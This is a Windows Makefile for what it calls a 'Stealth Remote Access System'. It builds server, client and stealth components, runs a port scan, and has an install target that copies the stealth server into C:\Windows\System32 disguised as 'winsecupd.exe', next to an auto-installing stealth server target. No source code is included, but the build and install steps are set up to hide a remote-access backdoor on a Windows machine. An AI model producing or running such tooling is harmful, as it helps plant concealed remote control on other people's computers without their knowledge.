# Makefile for Stealth Remote Access System

# Compiler settings
CXX = g++
CXXFLAGS = -std=c++11 -Wall -O2 -s -static-libgcc -static-libstdc++
LDFLAGS = -lws2_32
STEALTH_LDFLAGS = -lws2_32 -lshell32 -ladvapi32

# Targets
all: basic advanced stealth

# Basic components
basic: server client

server: server.cpp
	$(CXX) $(CXXFLAGS) server.cpp -o server.exe $(LDFLAGS)

client: client.cpp
	$(CXX) $(CXXFLAGS) client.cpp -o client.exe $(LDFLAGS)

# Advanced components
advanced: advanced_server advanced_client remote_client

advanced_server: advanced_server.cpp
	$(CXX) $(CXXFLAGS) advanced_server.cpp -o advanced_server.exe $(STEALTH_LDFLAGS)

advanced_client: advanced_client.cpp
	$(CXX) $(CXXFLAGS) advanced_client.cpp -o advanced_client.exe $(LDFLAGS)

remote_client: remote_client.cpp
	$(CXX) $(CXXFLAGS) remote_client.cpp -o remote_client.exe $(LDFLAGS)

# Stealth components
stealth: stealth_server stealth_basic

stealth_server: stealth_server.cpp
	$(CXX) $(CXXFLAGS) stealth_server.cpp -o stealth_server.exe $(STEALTH_LDFLAGS)

stealth_basic: server.cpp
	$(CXX) $(CXXFLAGS) -DSTEALTH_MODE server.cpp -o server-stealth.exe $(LDFLAGS)

# Installation targets
install: all
	copy stealth_server.exe C:\Windows\System32\winsecupd.exe
	copy remote_client.exe C:\Windows\System32\

install_stealth: stealth_server
	stealth_server.exe

# Testing targets
test_local: server client
	start /min server.exe
	timeout /t 2 /nobreak
	client.exe

test_remote: remote_client
	remote_client.exe

# Cleanup
clean:
	del /f *.exe 2>nul || echo No executables to clean

clean_all: clean
	del /f *.o *.obj 2>nul || echo No object files to clean

# Port scanning utility
scan: remote_client
	remote_client.exe 127.0.0.1 0 scan 1 1000

# Help
help:
	@echo ================================================
	@echo     Stealth Remote Access System - Makefile
	@echo ================================================
	@echo.
	@echo Build targets:
	@echo   all            - Build all components
	@echo   basic          - Build basic server and client
	@echo   advanced       - Build advanced components
	@echo   stealth        - Build stealth components
	@echo.
	@echo Individual targets:
	@echo   server         - Basic server
	@echo   client         - Basic client
	@echo   advanced_server - Advanced server with features
	@echo   advanced_client - Advanced client
	@echo   remote_client  - Remote access client
	@echo   stealth_server - Stealth server (auto-install)
	@echo.
	@echo Installation:
	@echo   install        - Install to system directories
	@echo   install_stealth - Install and start stealth server
	@echo.
	@echo Testing:
	@echo   test_local     - Test local connection
	@echo   test_remote    - Test remote client
	@echo   scan           - Port scan localhost
	@echo.
	@echo Utilities:
	@echo   clean          - Remove executables
	@echo   clean_all      - Remove all build files
	@echo   help           - Show this help
	@echo.
	@echo Usage examples:
	@echo   make all                    - Build everything
	@echo   make stealth_server         - Build stealth server only
	@echo   make install_stealth        - Install stealth server
	@echo   make test_local             - Test local setup
	@echo.

.PHONY: all basic advanced stealth server client advanced_server advanced_client remote_client stealth_server stealth_basic install install_stealth test_local test_remote scan clean clean_all help